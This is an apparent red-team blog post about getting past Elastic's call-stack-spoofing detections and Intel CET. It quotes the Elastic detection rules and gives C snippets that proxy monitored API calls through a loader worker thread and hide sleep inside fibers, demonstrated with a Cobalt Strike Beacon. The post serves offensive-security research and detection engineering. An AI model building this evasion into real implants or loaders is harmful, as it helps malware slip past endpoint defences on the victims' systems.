@@ -1,0 +1,147 @@
+# https://bigbingus.com/posts/stop-being-weird/
+
+<!DOCTYPE html><html lang="en-us" class="light"><body data-theme="" class=""><div class="wrapper post"><main class="page-content" aria-label="Content"><article><div class="page-content"><h2 id="background">Background</h2><p>For the past few weeks I’ve been experimenting with Control Flow Enforcement Technology (CET) mitigations and Elastic’s call stack spoofing detections. Specifically their <a href="https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/windows/defense_evasion_api_call_via_jump_rop_gadget.toml">API Call via Jump ROP Gadget</a>, <a href="https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/windows/defense_evasion_stack_spoofing_via_rop_gadget_for_dll_load.toml">Stack Spoofing via ROP Gadget for Dll Load</a> and <a href="https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/windows/defense_evasion_stack_spoofing_via_rop_gadget_for_memory_api.toml">Stack Spoofing via ROP Gadget for Memory API</a> rules and I wanted to share my understanding of the current situation and a potential way forward.</p><p><em>Code: <a href="https://github.com/Sizeable-Bingus/MassDriver">github.com/Sizeable-Bingus/MassDriver</a></em></p><p><em>There are multiple ways of spoofing a call stack but I will be referring to what I see to be the most common which is gadget-based with synthetic frames.</em></p><h3 id="call-stack-spoofing">Call Stack Spoofing</h3><p>The goal of call stack spoofing is to eliminate unbacked return addresses from the call stack when calling a monitored API, as this is a high fidelity indicator of shellcode. When no spoofing is in place the classic execution flow looks something like:</p><pre tabindex="0"><code>Artifact.exe -&gt; shellcode -&gt; LoadLibraryA("wininet.dll")
+
+Elastic sees:
+    LoadLibraryA          &lt;- kernel32.dll (backed)
+    0xDEADBEEF            &lt;- unbacked return
+    0x12345678            &lt;- non unwindable garbage
+    0x12345678            &lt;- non unwindable garbage
+
+Sensitive API returning to unbacked memory -&gt; process killed
+</code></pre><p>With call stack spoofing the shellcode now (at a high level) does the following spoofing routine before making the call to the monitored API:</p><ol><li>Find a <code>jmp &lt;nonvol&gt;</code> gadget (typically in <code>kernelbase</code>) and stash it in a non-volatile register</li><li>Build fake <code>RtlUserThreadStart</code> and <code>BaseThreadInitThunk</code> frames</li><li>Push the gadget address as the return target</li><li>Jump to the target API</li></ol><pre tabindex="0"><code>Artifact.exe -&gt; shellcode -&gt; spoofing routine -&gt; LoadLibraryA("wininet.dll")
+
+Elastic sees:
+    kernelbase.dll!LoadLibraryA
+    kernelbase.dll!SomeFunction+0x123    &lt;- jmp &lt;nonvol&gt; gadget
+    kernel32.dll!BaseThreadInitThunk     &lt;- synthetic frame
+    ntdll.dll!RtlUserThreadStart         &lt;- synthetic frame
+
+No unbacked addresses -&gt; all good :)
+</code></pre><p>This works for classic call stack detections that simply scan for unbacked return addresses in the call stack. However, this falls apart when subject to additional scrutiny like the aforementioned rules.</p><h3 id="call-stack-spoofing-detections">Call Stack Spoofing Detections</h3><p>The <a href="https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/windows/defense_evasion_api_call_via_jump_rop_gadget.toml">first rule</a> detects this kind of call stack spoofing. We are most interested in the first detection condition of the rule, which matches when calling one of the monitored APIs if your process has <code>image_rop</code> behaviour (a return address in the stack is not immediately preceded by a <code>call</code> instruction) and returns to a <code>jmp &lt;REG&gt;</code> or <code>push &lt;REG&gt;; ret</code> pattern:</p><pre tabindex="0"><code>api where process.Ext.api.behaviors == "image_rop" and
+ process.Ext.api.name in ("VirtualAlloc", "VirtualProtect", "WriteProcessMemory", "SetThreadContext", "SuspendThread", "VirtualProtectEx") and
+ not process.thread.Ext.call_stack_final_user_module.name in ("Kernel", "Unbacked") and
+ /* final user module trailing bytes starts with JMP or CALL REG pattern */
+ (
+  _arraysearch(process.thread.Ext.call_stack, $entry,
+               stringcontains~($entry.symbol_info, process.thread.Ext.call_stack_final_user_module.name) and $entry.callsite_trailing_bytes regex """(([23][6e]|[45].|6[4-7]|90|f[023])?ff[12de][3-7]|([23][6e]|4.|6[4-7]|90|f[023])?5[3-7]c3).+""" and not $entry.callsite_trailing_bytes : "ff15*")
+
+&lt;...SNIP...&gt;
+</code></pre><p>This works quite well as gadgets that are preceded by a <code>call</code> are fairly rare, and the most common way of obtaining a <code>jmp &lt;nonvol&gt;</code> gadget is to scan <code>kernelbase.dll</code> at runtime and pick a random one (which won’t be <code>image_rop</code> compatible):</p><pre tabindex="0"><code>Artifact.exe -&gt; shellcode -&gt; spoofing routine -&gt; LoadLibraryA("wininet.dll")
+
+Elastic sees:
+        kernelbase.dll!LoadLibraryA
+        kernelbase.dll!SomeFunction+0x123    &lt;- jmp &lt;nonvol&gt; with no preceding `call`
+        kernel32.dll!BaseThreadInitThunk
+        ntdll.dll!RtlUserThreadStart
+
+image_rop and returning to gadget -&gt; process killed
+</code></pre><p>The natural answer to this is to find <code>image_rop</code> compatible gadgets. This can be done with something like RastaMouse’s <a href="https://github.com/rasta-mouse/GadgetHunter">GadgetHunter</a>, which scans for gadgets preceded by call instructions. The spoofing routine is the same except a specific gadget is used instead of a random one:</p><pre tabindex="0"><code>Artifact.exe -&gt; LoadLibraryA("archiveint.dll") -&gt; shellcode -&gt; spoofing routine -&gt; LoadLibraryA("wininet.dll")
+
+Elastic sees:
+        kernelbase.dll!LoadLibraryA
+        archiveint.dll!SomeFunction+0x123     &lt;- jmp &lt;nonvol&gt; with preceding `call`
+        kernel32.dll!BaseThreadInitThunk
+        ntdll.dll!RtlUserThreadStart
+</code></pre><p>However, since these <code>image_rop</code> compatible gadgets are fairly rare across Windows DLLs, their usage to call monitored APIs can be susceptible to call stack signatures as shown in the <a href="https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/windows/defense_evasion_stack_spoofing_via_rop_gadget_for_memory_api.toml">second rule</a> (last call on left):</p><pre tabindex="0"><code>query = '''
+library where
+  dll.name in (
+    "ws2_32.dll",
+    "wininet.dll",
+    "winhttp.dll",
+    "system.directoryservices.ni.dll",
+    "system.management.automation.ni.dll",
+    "netapi32.dll",
+    "dnsapi.dll"
+  ) and
+  process.thread.Ext.call_stack_summary in (
+    "ntdll.dll|kernelbase.dll|dfshim.dll|kernel32.dll|ntdll.dll",
+    "ntdll.dll|dfshim.dll|kernel32.dll|ntdll.dll",
+    "ntdll.dll|kernelbase.dll|archiveint.dll|kernel32.dll|ntdll.dll",
+    "ntdll.dll|archiveint.dll|kernel32.dll|ntdll.dll",
+    "ntdll.dll|kernelbase.dll|authfwsnapin.dll|kernel32.dll|ntdll.dll",
+    "ntdll.dll|authfwsnapin.dll|kernel32.dll|ntdll.dll",
+
+&lt;...SNIP...&gt;
+</code></pre><p>Now this method of spoofing is forced into a losing situation where specific gadgets must be used to avoid <code>image_rop</code>, but since those gadgets are relatively rare their usage can eventually be signatured:</p><pre tabindex="0"><code>Artifact.exe -&gt; LoadLibraryA("archiveint.dll") -&gt; Artifact.exe -&gt; shellcode -&gt; spoofing routine -&gt; LoadLibraryA("wininet.dll")
+
+Elastic sees:
+        ntdll.dll!LdrLoadDll
+        kernelbase.dll!LoadLibraryA
+        archiveint.dll!SomeFunction+0x123
+        kernel32.dll!BaseThreadInitThunk
+        ntdll.dll!RtlUserThreadStart
+
+Callstack summary matches
+ntdll.dll|kernelbase.dll|archiveint.dll|kernel32.dll|ntdll.dll -&gt; process killed
+</code></pre><p><em>You might be thinking you could drop the <code>kernel32.dll!BaseThreadInitThunk</code> and <code>ntdll.dll!RtlUserThreadStart</code> frames to avoid these signatures, but a truncated stack is even more suspicious.</em></p><h3 id="control-flow-enforcement-technology-cet">Control-flow Enforcement Technology (CET)</h3><p><a href="https://www.intel.com/content/www/us/en/content-details/785687/complex-shadow-stack-updates-intel-control-flow-enforcement-technology.html">CET</a> is a mitigation targeting ROP. At a high level it works by storing a protected copy of the call stack that an attacker cannot control. Whenever a <code>ret</code> instruction is executed the address to return to is checked against the protected copy, and if they do not match there is a fault. For a deeper dive on how this is implemented on Windows, see <a href="https://windows-internals.com/cet-on-windows/">this writeup</a>.</p><p>This effectively kills this method of call stack spoofing since the stack frame is modified to return to the <code>jmp &lt;nonvol&gt;</code> gadget, which will not match the actual return address on the shadow stack.</p><p>There has been some <a href="https://klezvirus.github.io/posts/Byoud/">fantastic research</a> by klezVirus on CET compatible call stack spoofing which I highly recommend reading. I won’t go into detail on his technique here, but instead show my attempt at taking his advice by trying to make shellcode as natural as possible.</p><blockquote><p>“As both hardware and software mitigations become widely adopted, creating effective evasion techniques will get more difficult. Malware authors will probably find it safer to implement more natural execution flows that resemble legitimate software rather than traditional exploits.”</p></blockquote><h2 id="being-normal">Being Normal</h2><p><img src="https://bigbingus.com/posts/stop-being-weird/normal.jpg" alt="Spongebob meme"></p><p>Inspired by klezVirus’ research I decided to reason about the simplest solution I could think of to get a normal execution flow while still keeping our 1337 sh311c0d3z alive.</p><p>The core idea is that traditional malware has some level of normal execution to load the shellcode (i.e. your artifact), so we can have the shellcode offload the execution of all monitored APIs to the artifact to get a clean call stack without any spoofing at all.</p><p>Before executing the shellcode the artifact will first start a worker thread to listen for messages from the shellcode:</p><h4 id="mass_driverh">mass_driver.h</h4><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="display:flex"><span><span style="color:#75715e">#define WM_CALL_FUNCTION (WM_USER + 1)
+</span></span></span><span style="display:flex"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex"><span><span style="color:#66d9ef">typedef</span> <span style="color:#a6e22e">ULONG_PTR</span> (<span style="color:#f92672">*</span>MD_FUNC_PTR)(ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR);
+</span></span><span style="display:flex"><span>
+</span></span><span style="display:flex"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> {
+</span></span><span style="display:flex"><span>    HANDLE hDone;
+</span></span><span style="display:flex"><span>    MD_FUNC_PTR lpFunction;
+</span></span><span style="display:flex"><span>    DWORD dwArgc;
+</span></span><span style="display:flex"><span>    ULONG_PTR result;
+</span></span><span style="display:flex"><span>    ULONG_PTR args[<span style="color:#ae81ff">10</span>];
+</span></span><span style="display:flex"><span>} MD_FUNCTION_CALL, <span style="color:#f92672">*</span>PMD_FUNCTION_CALL;
+</span></span></code></pre></div><h4 id="mainc">main.c</h4><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="display:flex"><span>DWORD WINAPI <span style="color:#a6e22e">massDriverWorker</span>(LPVOID lpParam) {
+</span></span><span style="display:flex"><span>    MSG msg;
+</span></span><span style="display:flex"><span>
+</span></span><span style="display:flex"><span>    <span style="color:#a6e22e">PeekMessage</span>(<span style="color:#f92672">&amp;</span>msg, NULL, WM_USER, WM_USER, PM_NOREMOVE);
+</span></span><span style="display:flex"><span>
+</span></span><span style="display:flex"><span>    <span style="color:#66d9ef">while</span> (<span style="color:#a6e22e">GetMessage</span>(<span style="color:#f92672">&amp;</span>msg, NULL, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>)) {
+</span></span><span style="display:flex"><span>        <span style="color:#66d9ef">if</span> (msg.message <span style="color:#f92672">==</span> WM_CALL_FUNCTION) {
+</span></span><span style="display:flex"><span>            PMD_FUNCTION_CALL pCall <span style="color:#f92672">=</span> (PMD_FUNCTION_CALL)msg.lParam;
+</span></span><span style="display:flex"><span>            ULONG_PTR result <span style="color:#f92672">=</span> pCall<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">lpFunction</span>(pCall<span style="color:#f92672">-&gt;</span>args[<span style="color:#ae81ff">0</span>], pCall<span style="color:#f92672">-&gt;</span>args[<span style="color:#ae81ff">1</span>], pCall<span style="color:#f92672">-&gt;</span>args[<span style="color:#ae81ff">2</span>], pCall<span style="color:#f92672">-&gt;</span>args[<span style="color:#ae81ff">3</span>], pCall<span style="color:#f92672">-&gt;</span>args[<span style="color:#ae81ff">4</span>], pCall<span style="color:#f92672">-&gt;</span>args[<span style="color:#ae81ff">5</span>], pCall<span style="color:#f92672">-&gt;</span>args[<span style="color:#ae81ff">6</span>], pCall<span style="color:#f92672">-&gt;</span>args[<span style="color:#ae81ff">7</span>], pCall<span style="color:#f92672">-&gt;</span>args[<span style="color:#ae81ff">8</span>], pCall<span style="color:#f92672">-&gt;</span>args[<span style="color:#ae81ff">9</span>]);
+</span></span><span style="display:flex"><span>            pCall<span style="color:#f92672">-&gt;</span>result <span style="color:#f92672">=</span> result;
+</span></span><span style="display:flex"><span>            <span style="color:#a6e22e">SetEvent</span>(pCall<span style="color:#f92672">-&gt;</span>hDone);
+</span></span><span style="display:flex"><span>        }
+</span></span><span style="display:flex"><span>    }
+</span></span><span style="display:flex"><span>
+</span></span><span style="display:flex"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex"><span>}
+</span></span></code></pre></div><p>When the shellcode wants to call a monitored API it sets up the function call structure and sends it to the worker thread:</p><h4 id="shellcodec">shellcode.c</h4><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="display:flex"><span>ULONG_PTR <span style="color:#a6e22e">massDriver</span>(DWORD dwThreadId, LPVOID lpFunction, DWORD dwArgc, ...) {
+</span></span><span style="display:flex"><span>    va_list args;
+</span></span><span style="display:flex"><span>    MD_FUNCTION_CALL call <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
+</span></span><span style="display:flex"><span>    call.lpFunction <span style="color:#f92672">=</span> lpFunction;
+</span></span><span style="display:flex"><span>    call.dwArgc <span style="color:#f92672">=</span> dwArgc;
+</span></span><span style="display:flex"><span>    call.hDone <span style="color:#f92672">=</span> KERNEL32<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#a6e22e">CreateEventA</span>(NULL, FALSE, FALSE, NULL);
+</span></span><span style="display:flex"><span>
+</span></span><span style="display:flex"><span>    <span style="color:#a6e22e">va_start</span>(args, dwArgc);
+</span></span><span style="display:flex"><span>    <span style="color:#66d9ef">for</span> (DWORD i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> dwArgc; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex"><span>        call.args[i] <span style="color:#f92672">=</span> <span style="color:#a6e22e">va_arg</span>(args, ULONG_PTR);
+</span></span><span style="display:flex"><span>    }
+</span></span><span style="display:flex"><span>    <span style="color:#a6e22e">va_end</span>(args);
+</span></span><span style="display:flex"><span>
+</span></span><span style="display:flex"><span>    USER32<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#a6e22e">PostThreadMessageA</span>(dwThreadId, WM_CALL_FUNCTION, <span style="color:#ae81ff">0</span>, (LPARAM)<span style="color:#f92672">&amp;</span>call);
+</span></span><span style="display:flex"><span>    KERNEL32<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#a6e22e">WaitForSingleObject</span>(call.hDone, INFINITE);
+</span></span><span style="display:flex"><span>    <span style="color:#66d9ef">return</span> call.result;
+</span></span><span style="display:flex"><span>}
+</span></span><span style="display:flex"><span>
+</span></span><span style="display:flex"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">go</span>(DWORD dwMassDriverThreadId) {
+</span></span><span style="display:flex"><span>    HMODULE hMod <span style="color:#f92672">=</span> (HMODULE)<span style="color:#a6e22e">massDriver</span>(dwMassDriverThreadId, KERNEL32<span style="color:#960050;background-color:#1e0010">$</span>LoadLibraryA, <span style="color:#ae81ff">1</span>, <span style="color:#e6db74">"wininet.dll"</span>); 
+</span></span><span style="display:flex"><span>}
+</span></span></code></pre></div><p>We can see the shellcode sends the <code>LoadLibraryA</code> call to the artifact and has a normal call stack:</p><p><img src="https://bigbingus.com/posts/stop-being-weird/Pasted%20image%2020260504110840.png" alt="x64dbg LoadLibraryA call stack PoC"></p><p><img src="https://bigbingus.com/posts/stop-being-weird/Pasted%20image%2020260504111901.png" alt="x64dbg dprintf verification"></p><h2 id="being-useful">Being Useful</h2><p>I decided to include an <a href="https://github.com/Sizeable-Bingus/MassDriver">example loader</a> to show this same technique applied to something a bit more concrete. Currently the example just hooks <code>LoadLibraryA</code> and <code>Sleep</code> calls, but other hooks are easily added. Here we can see this idea applied at runtime when we execute the <code>whoami</code> BOF, which causes Beacon to call <code>LoadLibraryA</code> when resolving <code>SECUR32!GetUserNameExA</code>:</p><p><img src="https://bigbingus.com/posts/stop-being-weird/Pasted%20image%2020260511094402.png" alt="Running whoami BOF in Cobalt Strike"></p><p><img src="https://bigbingus.com/posts/stop-being-weird/Pasted%20image%2020260511094329.png" alt="x64dbg LoadLibraryA call stack with Beacon"></p><p>This pattern of waiting on the artifact worker thread works fine for most API calls since (as far as I know) only the call stack of the calling thread is inspected when a monitored API is called. However, this doesn’t work well during sleep, as the sleep call sent to the worker thread will be normal, but the thread waiting on the call in the worker thread will look exactly like a sleeping beacon:</p><div style="display:flex;flex-wrap:wrap;gap:1rem"><img src="https://bigbingus.com/posts/stop-being-weird/Pasted%20image%2020260511095000.png" style="flex:1 1 300px;min-width:0" alt="Sleeping thread call stack">
+<img src="https://bigbingus.com/posts/stop-being-weird/Pasted%20image%2020260511095032.png" style="flex:1 1 300px;min-width:0" alt="Waiting thread call stack"></div><p>So now we are back to square one when it comes to masking the stack at sleep, except we can use the same concept in a slightly different way by getting funky with <a href="https://agraphicsguynotes.com/posts/fiber_in_cpp_understanding_the_basics/">fibers</a>. Fibers are given special support under CET as their function depends on swapping their stack frame (if you want to know about the internals of this process there’s a <a href="https://i.blackhat.com/asia-19/Thu-March-28/bh-asia-Sun-How-to-Survive-the-Hardware-Assisted-Control-Flow-Integrity-Enforcement.pdf">great slide deck</a> by Bing Sun, Jin Liu and Chong Xu that explains how fibers work under CET).</p><h4 id="mass_driverh-1">mass_driver.h</h4><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="display:flex"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> {
+</span></span><span style="display:flex"><span>    LPVOID pCallerFiber;
+</span></span><span style="display:flex"><span>    DWORD dwSleepTime;
+</span></span><span style="display:flex"><span>} FIBER_SLEEP_CTX, <span style="color:#f92672">*</span>PFIBER_SLEEP_CTX;
+</span></span></code></pre></div><h4 id="runnerc-artifact">runner.c (artifact)</h4><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="display:flex"><span>VOID WINAPI <span style="color:#a6e22e">fiberSleepProc</span>(LPVOID lpParam) {
+</span></span><span style="display:flex"><span>    PFIBER_SLEEP_CTX pCtx <span style="color:#f92672">=</span> (PFIBER_SLEEP_CTX)lpParam;
+</span></span><span style="display:flex"><span>    <span style="color:#a6e22e">Sleep</span>(pCtx<span style="color:#f92672">-&gt;</span>dwSleepTime);
+</span></span><span style="display:flex"><span>    <span style="color:#a6e22e">SwitchToFiber</span>(pCtx<span style="color:#f92672">-&gt;</span>pCallerFiber);
+</span></span><span style="display:flex"><span>}
+</span></span></code></pre></div><h4 id="hooksh-shellcode">hooks.h (shellcode)</h4><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="display:flex"><span>VOID <span style="color:#a6e22e">fiberSleep</span>(DWORD dwMilliseconds, LPVOID lpFiberSleepProc) {
+</span></span><span style="display:flex"><span>    FIBER_SLEEP_CTX ctx <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
+</span></span><span style="display:flex"><span>    ctx.pCallerFiber <span style="color:#f92672">=</span> KERNEL32<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#a6e22e">ConvertThreadToFiber</span>(NULL);
+</span></span><span style="display:flex"><span>    ctx.dwSleepTime <span style="color:#f92672">=</span> dwMilliseconds;
+</span></span><span style="display:flex"><span>
+</span></span><span style="display:flex"><span>    LPVOID sleepFiber <span style="color:#f92672">=</span> KERNEL32<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#a6e22e">CreateFiber</span>(<span style="color:#ae81ff">0</span>, (LPFIBER_START_ROUTINE)lpFiberSleepProc, <span style="color:#f92672">&amp;</span>ctx);
+</span></span><span style="display:flex"><span>
+</span></span><span style="display:flex"><span>    KERNEL32<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#a6e22e">SwitchToFiber</span>(sleepFiber);
+</span></span><span style="display:flex"><span>    KERNEL32<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#a6e22e">DeleteFiber</span>(sleepFiber);
+</span></span><span style="display:flex"><span>    KERNEL32<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#a6e22e">ConvertFiberToThread</span>();
+</span></span><span style="display:flex"><span>}
+</span></span></code></pre></div><p>Here we convert our Beacon thread to a fiber, create a fiber on our <code>fiberSleepProc</code>, and then switch to that fiber. The <code>fiberSleepProc</code> simply sleeps for the requested amount of time and switches back to the shellcode fiber, which is then converted back to a thread.</p><p>With both the function proxy and fiber sleep implemented, we get CET compatible clean call stacks during sensitive API calls and while sleeping. Here we can see the full PoC running on a CET enabled system:</p><p><img src="https://bigbingus.com/posts/stop-being-weird/CETModules.png" alt="System Informer showing CET enabled modules"></p><div style="display:flex;flex-wrap:wrap;gap:1rem"><img src="https://bigbingus.com/posts/stop-being-weird/CETLL.png" style="flex:1 1 300px;min-width:0" alt="System Informer CET LoadLibraryA call stack">
+<img src="https://bigbingus.com/posts/stop-being-weird/CETSleep.png" style="flex:1 1 300px;min-width:0" alt="System Informer CET Sleep call stack"></div><h2 id="caveats">Caveats</h2><p>This is more of a workaround than an actual replacement for call stack spoofing. You lose a lot of flexibility when your loader and payload are dependent on your artifact, and this dependency complicates things like process injection or other in memory shenanigans. It can be annoying to work with from a development perspective, as you have shared functionality between the shellcode and artifact instead of a traditional clean handoff.</p><p>The fiber sleep trick is fairly old and could be a detection vector.</p><p>There is also extra functionality on disk which can be collected, analyzed, signatured, etc., but I don’t think this would be that big of a deal as there are many ways of implementing this same concept and it’s pretty low effort to do so.</p><h2 id="final-thoughts">Final Thoughts</h2><p>Call stack spoofing will be increasingly complex as detections and exploit mitigations target the anomalies it relies on. I’ve shown an example of how to move the critical parts of existing tooling into normal execution flows. I think traditional in memory capability will eventually fall out of favor in the (far) future for most teams, but my entire understanding of this situation could be flawed, so make up your own mind.</p><p>Code: <a href="https://github.com/Sizeable-Bingus/MassDriver">github.com/Sizeable-Bingus/MassDriver</a></p><h2 id="references">References</h2><ul><li><a href="https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/windows/defense_evasion_api_call_via_jump_rop_gadget.toml">https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/windows/defense_evasion_api_call_via_jump_rop_gadget.toml</a></li><li><a href="https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/windows/defense_evasion_stack_spoofing_via_rop_gadget_for_dll_load.toml">https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/windows/defense_evasion_stack_spoofing_via_rop_gadget_for_dll_load.toml</a></li><li><a href="https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/windows/defense_evasion_stack_spoofing_via_rop_gadget_for_memory_api.toml">https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/windows/defense_evasion_stack_spoofing_via_rop_gadget_for_memory_api.toml</a></li><li><a href="https://www.intel.com/content/www/us/en/content-details/785687/complex-shadow-stack-updates-intel-control-flow-enforcement-technology.html">https://www.intel.com/content/www/us/en/content-details/785687/complex-shadow-stack-updates-intel-control-flow-enforcement-technology.html</a></li><li><a href="https://klezvirus.github.io/posts/Byoud/">https://klezvirus.github.io/posts/Byoud/</a></li><li><a href="https://github.com/rasta-mouse/GadgetHunter">https://github.com/rasta-mouse/GadgetHunter</a></li><li><a href="https://agraphicsguynotes.com/posts/fiber_in_cpp_understanding_the_basics/">https://agraphicsguynotes.com/posts/fiber_in_cpp_understanding_the_basics/</a></li><li><a href="https://windows-internals.com/cet-on-windows/">https://windows-internals.com/cet-on-windows/</a></li><li><a href="https://i.blackhat.com/asia-19/Thu-March-28/bh-asia-Sun-How-to-Survive-the-Hardware-Assisted-Control-Flow-Integrity-Enforcement.pdf">https://i.blackhat.com/asia-19/Thu-March-28/bh-asia-Sun-How-to-Survive-the-Hardware-Assisted-Control-Flow-Integrity-Enforcement.pdf</a></li></ul></div></article></main></div></body></html>
